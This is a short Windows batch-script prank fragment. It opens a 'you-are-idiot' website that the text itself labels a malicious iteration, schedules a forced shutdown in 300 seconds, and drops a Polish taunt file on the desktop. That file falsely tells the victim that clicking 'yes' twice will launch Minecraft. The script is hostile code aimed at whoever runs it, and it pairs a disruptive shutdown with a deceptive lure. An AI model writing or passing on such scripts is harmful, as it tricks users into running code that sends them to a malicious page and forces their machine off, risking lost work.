...
start https://you-are-idiot.github.io/#:~:text=This%20is%20a%20new%20malicious%20iteration%20of%20the%20legendary%20website.
shutdown -s -t 300
start notepad.exe
cd Deskop
echo TROLLED:) kliknij w okienko yes, potem też yes włonczysz w ten sposób minecraft:)!>minecraft.txt
start minecraft.txt
